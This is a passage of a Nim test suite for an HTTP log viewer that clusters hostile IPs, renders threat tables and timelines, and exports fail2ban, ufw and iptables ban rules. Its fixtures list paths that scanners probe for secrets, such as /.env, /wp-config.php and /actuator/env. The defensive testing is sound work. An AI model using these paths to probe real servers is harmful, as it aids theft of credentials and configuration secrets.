    let line300 = renderStreamLine(fullRecord, colorize = true, useEmoji = true, maxWidth = 300)
    check terminalDisplayWidth(line300) <= 300
    check line300.contains(longPath)
    check line300.contains(longUa)

    # Unconstrained (maxWidth = 0)
    let lineUnconstrained = renderStreamLine(fullRecord, colorize = false, useEmoji = false, maxWidth = 0)
    check lineUnconstrained.contains(longPath)
    check lineUnconstrained.contains(longUa)

  test "Item 06: Extremely narrow display (50 columns) falls back gracefully without crash":
    let entry = initHttpLogEntry(clientIp = "192.168.1.1", path = "/very/long/path", statusCode = 200)
    let record = initEnrichedLogRecord(entry)

    let line50 = renderStreamLine(record, colorize = true, useEmoji = true, maxWidth = 50)
    check terminalDisplayWidth(line50) <= 50
    check line50.endsWith("\e[0m")

suite "Grouped Actor Summary Table (Phase 06 / Category C / Item 01)":
  test "Item 01: sortClustersByRisk sorts clusters in descending risk order":
    let cLow = newActorCluster(clusterId = "ACTOR-LOW", highestThreatScore = 20, aggregateRisk = 20, totalRequests = 5)
    let cMed = newActorCluster(clusterId = "ACTOR-MED", highestThreatScore = 50, aggregateRisk = 50, totalRequests = 10)
    let cHigh = newActorCluster(clusterId = "ACTOR-HIGH", highestThreatScore = 95, aggregateRisk = 95, totalRequests = 2)

    let sorted = sortClustersByRisk([cLow, cHigh, cMed])
    check sorted.len == 3
    check sorted[0].clusterId == "ACTOR-HIGH"
    check sorted[1].clusterId == "ACTOR-MED"
    check sorted[2].clusterId == "ACTOR-LOW"

  test "Item 01: sortClustersByRisk breaks ties using requests and IP counts":
    var ips1 = initHashSet[string]()
    ips1.incl("1.1.1.1")
    var ips2 = initHashSet[string]()
    ips2.incl("2.2.2.1"); ips2.incl("2.2.2.2")

    let c1 = newActorCluster(clusterId = "ACTOR-1", aggregateRisk = 80, totalRequests = 10, ips = ips1)
    let c2 = newActorCluster(clusterId = "ACTOR-2", aggregateRisk = 80, totalRequests = 20, ips = ips2)

    let sorted = sortClustersByRisk([c1, c2])
    check sorted[0].clusterId == "ACTOR-2" # Higher requests wins tie
    check sorted[1].clusterId == "ACTOR-1"

  test "Item 01: renderGroupedSummaryTable in wide layout includes all columns":
    var ips = initHashSet[string]()
    ips.incl("45.154.255.8"); ips.incl("194.26.29.112")
    let cluster = newActorCluster(
      clusterId = "ACTOR-7F3A",
      clusterTag = "[Actor #1: 2 IPs - WP-Scan Botnet]",
      category = CategoryBadActorHacker,
      highestThreatScore = 95,
      aggregateRisk = 95,
      totalRequests = 48,
      status404Count = 48,
      ips = ips,
      firstSeen = parse("2026-10-10 13:50:12", "yyyy-MM-dd HH:mm:ss"),
      lastSeen = parse("2026-10-10 13:58:45", "yyyy-MM-dd HH:mm:ss")
    )

    let wideTable = renderGroupedSummaryTable([cluster], colorize = false, maxWidth = 120)
    check wideTable.contains("CORRELATED MULTI-IP ACTOR CLUSTERS")
    check wideTable.contains("RANK")
    check wideTable.contains("CLUSTER ID")
    check wideTable.contains("TAG / CAMPAIGN")
    check wideTable.contains("THREAT LEVEL")
    check wideTable.contains("REQS")
    check wideTable.contains("404s")
    check wideTable.contains("IPS")
    check wideTable.contains("DURATION")
    check wideTable.contains("ACTOR-7F3A")
    check wideTable.contains("[Actor #1: 2 IPs - WP-Scan Botnet]")
    check wideTable.contains("[ HACKER! ] 95")
    check wideTable.contains("48")
    check wideTable.contains("08m 33s")
    check wideTable.contains("=")

  test "Item 01: renderGroupedSummaryTable in compact 80-col layout respects width":
    var ips = initHashSet[string]()
    ips.incl("1.2.3.4")
    let cluster = newActorCluster(
      clusterId = "ACTOR-B2A4",
      clusterTag = "[Actor #2: 1 IP - DotEnv Scanner]",
      category = CategoryBadActorHacker,
      aggregateRisk = 90,
      totalRequests = 12,
      ips = ips
    )

    let compactTable = renderGroupedSummaryTable([cluster], colorize = false, maxWidth = 80)
    for line in compactTable.splitLines():
      check terminalDisplayWidth(line) <= 80
    check compactTable.contains("ACTOR-B2A4")
    check compactTable.contains("[ HACKER! ] 90")

  test "Item 01: renderGroupedSummaryTable with empty cluster set produces informative banner":
    let emptyTable = renderGroupedSummaryTable(@[], colorize = false, maxWidth = 80)
    check emptyTable.contains("No correlated multi-IP actor clusters detected.")
    check emptyTable.contains("=")

  test "Item 01: Table and Correlator overloads format cleanly":
    var tbl = initTable[string, ActorCluster]()
    tbl["A1"] = newActorCluster(clusterId = "A1", aggregateRisk = 60, totalRequests = 5)
    let tblStr = renderGroupedSummaryTable(tbl, colorize = false)
    check tblStr.contains("A1")

    let corr = newActorCorrelator()
    corr.clusters["A2"] = newActorCluster(clusterId = "A2", aggregateRisk = 75, totalRequests = 8)
    let corrStr = renderGroupedSummaryTable(corr, colorize = false)
    check corrStr.contains("A2")

suite "Actor Cluster Card Display (Phase 06 / Category C / Item 02)":
  test "Item 02: renderActorClusterCard renders full profile per Spec 06 format":
    var ips = initHashSet[string]()
    ips.incl("45.154.255.8")
    ips.incl("194.26.29.112")
    ips.incl("185.220.101.5")
    ips.incl("193.32.161.20")
    ips.incl("193.32.161.21")
    ips.incl("193.32.161.22")

    var paths = @["/.env", "/wp-config.php", "/wp-login.php", "/xmlrpc.php", "/actuator/env"]

    let cluster = newActorCluster(
      clusterId = "ACTOR-7F3A",
      clusterTag = "[ACTOR-7F3A] - WordPress & Secret Probe Botnet",
      primaryUa = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      ips = ips,
      totalRequests = 48,
      status404Count = 48,
      firstSeen = parse("2026-10-10 13:50:12", "yyyy-MM-dd HH:mm:ss"),
      lastSeen = parse("2026-10-10 13:58:45", "yyyy-MM-dd HH:mm:ss"),
      highestThreatScore = 95,
      aggregateRisk = 95,
      category = CategoryBadActorHacker,
      flags = {ThreatCmsExploit, ThreatSensitiveFile},
      probedPaths = paths
    )

    let card = renderActorClusterCard(cluster, colorize = false, useEmoji = true, width = 80)
    check card.contains("CRITICAL ACTOR CLUSTER: [ACTOR-7F3A] - WordPress & Secret Probe Botnet")
    check card.contains("Risk Level      : [ HACKER! ] (Score: 95/100)")
    check card.contains("Total Requests  : 48 requests (48 x [ 404 ])")
    check card.contains("Distinct IPs    : 6 IPs across")
    check card.contains("45.154.255.8")
    check card.contains("194.26.29.112")
    check card.contains("185.220.101.5")
    check card.contains("193.32.161.20")
    check card.contains("Primary UA      : Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
    check card.contains("Probed Paths    : /.env")
    check card.contains("/wp-config.php")
    check card.contains("/wp-login.php")
    check card.contains("/xmlrpc.php")
    check card.contains("/actuator/env")
    check card.contains("First Seen      : 2026-10-10 13:50:12")
    check card.contains("Last Seen       : 2026-10-10 13:58:45 (Duration: 08m 33s)")

  test "Item 02: renderActorClusterCard formats indicators and hosting providers":
    var ips = initHashSet[string]()
    ips.incl("159.65.1.1")
    var provs = initHashSet[string]()
    provs.incl("DigitalOcean")
    var subnets = initHashSet[string]()
    subnets.incl("159.65.0.0/16")

    let cluster = newActorCluster(
      clusterId = "ACTOR-BURST",
      clusterTag = "[Actor #5: 1 IP (DigitalOcean) - Burst Probe]",
      ips = ips,
      hostingProviders = provs,
      subnets = subnets,
      proxyRotationDetected = true,
      synchronizedBurstDetected = true,
      category = CategoryBadActorHacker,
      aggregateRisk = 85
    )

    let card = renderActorClusterCard(cluster, colorize = false)
    check card.contains("Hosting / DC    : DigitalOcean")
    check card.contains("Subnets         : 159.65.0.0/16")
    check card.contains("Residential Proxy Rotation Detected")
    check card.contains("Synchronized Burst Fleet")

  test "Item 02: renderGroupedClusters formats list of cards cleanly":
    let c1 = newActorCluster(clusterId = "A1", aggregateRisk = 90, category = CategoryBadActorHacker)
    let c2 = newActorCluster(clusterId = "A2", aggregateRisk = 40, category = CategorySuspicious)

    let cards = renderGroupedClusters([c1, c2], colorize = false)
    check cards.contains("A1")
    check cards.contains("A2")
    check cards.contains("\n\n")

suite "Chronological Actor Timeline & Drill-Down (Phase 06 / Category C / Item 03)":
  test "Item 03: renderActorTimeline formats events chronologically with time deltas":
    let t0 = parse("2026-10-10 13:50:12", "yyyy-MM-dd HH:mm:ss")
    let t1 = parse("2026-10-10 13:50:14", "yyyy-MM-dd HH:mm:ss") # +2s
    let t2 = parse("2026-10-10 13:51:26", "yyyy-MM-dd HH:mm:ss") # +74s = +01:14s

    let e1 = initHttpLogEntry(clientIp = "45.154.255.8", timestamp = t0, `method` = HttpGet, path = "/.env", statusCode = 404)
    let e2 = initHttpLogEntry(clientIp = "194.26.29.112", timestamp = t1, `method` = HttpGet, path = "/wp-config.php", statusCode = 404)
    let e3 = initHttpLogEntry(clientIp = "185.220.101.5", timestamp = t2, `method` = HttpPost, path = "/wp-login.php", statusCode = 404)

    var ips = initHashSet[string]()
    ips.incl("45.154.255.8"); ips.incl("194.26.29.112"); ips.incl("185.220.101.5")

    # Pass in unsorted entries
    let cluster = newActorCluster(
      clusterId = "ACTOR-TIMELINE",
      ips = ips,
      entries = @[e2, e1, e3]
    )

    let timeline = renderActorTimeline(cluster, colorize = false, useEmoji = false)
    check timeline.contains("CHRONOLOGICAL ATTACK TIMELINE: [ACTOR-TIMELINE]")
    check timeline.contains("3 events across 3 distinct IPs")
    check timeline.contains("DELTA    TIME")

    # Chronologically e1 should appear before e2, e2 before e3
    let posE1 = timeline.find("/.env")
    let posE2 = timeline.find("/wp-config.php")
    let posE3 = timeline.find("/wp-login.php")
    check posE1 >= 0 and posE2 >= 0 and posE3 >= 0
    check posE1 < posE2
    check posE2 < posE3

    # Deltas
    check timeline.contains("+00:00s")
    check timeline.contains("+00:02s")
    check timeline.contains("+01:14s")

  test "Item 03: renderActorDetail produces full report with mitigation commands":
    var ips = initHashSet[string]()
    ips.incl("194.26.29.112")
    let cluster = newActorCluster(
      clusterId = "ACTOR-DETAIL",
      ips = ips,
      category = CategoryBadActorHacker,
      aggregateRisk = 90
    )

    let detail = renderActorDetail(cluster, colorize = false)
    check detail.contains("CRITICAL ACTOR CLUSTER")
    check detail.contains("CHRONOLOGICAL ATTACK TIMELINE")
    check detail.contains("QUICK MITIGATION (UFW / FAIL2BAN / IPTABLES)")
    check detail.contains("ufw deny from 194.26.29.112 to any comment 'http_logviewer ACTOR-DETAIL'")
    check detail.contains("iptables -A INPUT -s 194.26.29.112 -j DROP")

  test "Item 03: renderActorDetail with ActorCorrelator lookup":
    let corr = newActorCorrelator()
    let cl = newActorCluster(clusterId = "ACTOR-FOUND", aggregateRisk = 85, category = CategoryBadActorHacker)
    corr.clusters["ACTOR-FOUND"] = cl

    let resFound = renderActorDetail(corr, "ACTOR-FOUND", colorize = false)
    check resFound.contains("ACTOR-FOUND")

    let resNotFound = renderActorDetail(corr, "ACTOR-MISSING", colorize = false)
    check resNotFound.contains("Error: Actor cluster 'ACTOR-MISSING' not found")

suite "Exportable Incident Reports & Firewall Rules (Phase 06 / Category C / Item 04)":
  test "Item 04: generateFail2banRules creates valid banip script":
    var ips = initHashSet[string]()
    ips.incl("194.26.29.112"); ips.incl("185.220.101.5"); ips.incl("10.0.0.1") # 10.0.0.1 is private LAN and must be omitted
    let cluster = newActorCluster(clusterId = "ACTOR-F2B", ips = ips, aggregateRisk = 90, category = CategoryBadActorHacker)

    let f2b = generateFail2banRules([cluster], jail = "nginx-botsearch")
    check f2b.startsWith("#!/usr/bin/env bash")
    check f2b.contains("fail2ban-client set nginx-botsearch banip 185.220.101.5")
    check f2b.contains("fail2ban-client set nginx-botsearch banip 194.26.29.112")
    check not f2b.contains("10.0.0.1") # Private IP filtered out

  test "Item 04: generateUfwRules creates valid ufw deny script":
    var ips = initHashSet[string]()
    ips.incl("194.26.29.112")
    let cluster = newActorCluster(clusterId = "ACTOR-UFW", ips = ips, aggregateRisk = 85, category = CategoryBadActorHacker)

    let ufw = generateUfwRules([cluster])
    check ufw.contains("ufw deny from 194.26.29.112 to any comment 'http_logviewer ACTOR-UFW'")

  test "Item 04: generateIptablesRules creates valid iptables DROP script":
    var ips = initHashSet[string]()
    ips.incl("194.26.29.112")
    let cluster = newActorCluster(clusterId = "ACTOR-IPT", ips = ips, aggregateRisk = 85, category = CategoryBadActorHacker)

    let ipt = generateIptablesRules([cluster], chain = "INPUT")
    check ipt.contains("iptables -A INPUT -s 194.26.29.112 -j DROP -m comment --comment 'http_logviewer ACTOR-IPT'")

  test "Item 04: generateMarkdownReport creates valid Markdown document with tables and code blocks":
    var ips = initHashSet[string]()
    ips.incl("194.26.29.112")
    let cluster = newActorCluster(
      clusterId = "ACTOR-MD",
      clusterTag = "[ACTOR-MD] - Test Campaign",
      ips = ips,
      aggregateRisk = 90,
      category = CategoryBadActorHacker,
      totalRequests = 10,
      status404Count = 10,
      probedPaths = @["/.env", "/wp-login.php"]
    )

    let md = generateMarkdownReport([cluster], title = "Weekly Security Briefing")
    check md.startsWith("# Weekly Security Briefing")
    check md.contains("## 1. Executive Summary")
    check md.contains("## 2. Correlated Actor Clusters")
    check md.contains("| Cluster ID | Campaign / Tag | Risk Score |")
    check md.contains("| `ACTOR-MD` |")
    check md.contains("## 3. Rogue Threat Actor Profiles")
    check md.contains("### Cluster `ACTOR-MD`")
    check md.contains("## 4. Automated Firewall & Containment Rules")
    check md.contains("```bash")
    check md.contains("fail2ban-client set nginx-botsearch banip 194.26.29.112")

  test "Item 04: generatePlainTextReport creates clean text report":
    let cluster = newActorCluster(clusterId = "ACTOR-TXT", aggregateRisk = 90, category = CategoryBadActorHacker)
    let txt = generatePlainTextReport([cluster])
    check txt.contains("HTTP LOGVIEWER SECURITY INCIDENT REPORT")
    check txt.contains("CORRELATED MULTI-IP ACTOR CLUSTERS")
    check txt.contains("AUTOMATED FIREWALL CONTAINMENT RULES")

  test "Item 04: generateIncidentReport dispatches across formats":
    var ips = initHashSet[string]()
    ips.incl("194.26.29.112")
    let cluster = newActorCluster(clusterId = "ACTOR-DISP", ips = ips, aggregateRisk = 90, category = CategoryBadActorHacker)
    let md = generateIncidentReport([cluster], ReportMarkdown)
    let txt = generateIncidentReport([cluster], ReportPlainText)
    let f2b = generateIncidentReport([cluster], ReportFail2ban)
    let ufw = generateIncidentReport([cluster], ReportUfw)
    let ipt = generateIncidentReport([cluster], ReportIptables)

    check md.contains("# HTTP LogViewer Security Incident Report")
    check txt.contains("HTTP LOGVIEWER SECURITY INCIDENT REPORT")
    check f2b.contains("fail2ban-client")
    check ufw.contains("ufw deny")
    check ipt.contains("iptables -A")

suite "Actor Group Table Formatting & Edge Cases (Phase 06 / Category C / Item 05)":
  test "Item 05: Nil cluster in openArray is handled safely":
    let valid = newActorCluster(clusterId = "VALID", aggregateRisk = 50)
    let sorted = sortClustersByRisk([valid, nil])
    check sorted.len == 1
    check sorted[0].clusterId == "VALID"

  test "Item 05: Multi-country cluster accurately summarizes country count":
    var ips = initHashSet[string]()
    ips.incl("8.8.8.8")       # US
    ips.incl("78.46.1.1")     # DE (Hetzner)
    ips.incl("82.168.1.1")    # NL
    let cluster = newActorCluster(clusterId = "A-MULTI", ips = ips, aggregateRisk = 80, category = CategoryBadActorHacker)

    let card = renderActorClusterCard(cluster, colorize = false, useEmoji = true)
    check card.contains("3 IPs across 3 countries")
    check card.contains("US - United States")
    check card.contains("DE - Germany")
    check card.contains("NL - Netherlands")

  test "Item 05: Private LAN IPs displayed with house emoji and LAN label":
    var ips = initHashSet[string]()
    ips.incl("192.168.1.50")
    let cluster = newActorCluster(clusterId = "A-LAN", ips = ips, aggregateRisk = 30, category = CategorySuspicious)

    let card = renderActorClusterCard(cluster, colorize = false, useEmoji = true)
    check card.contains("🏠 LO - Local / Private LAN")







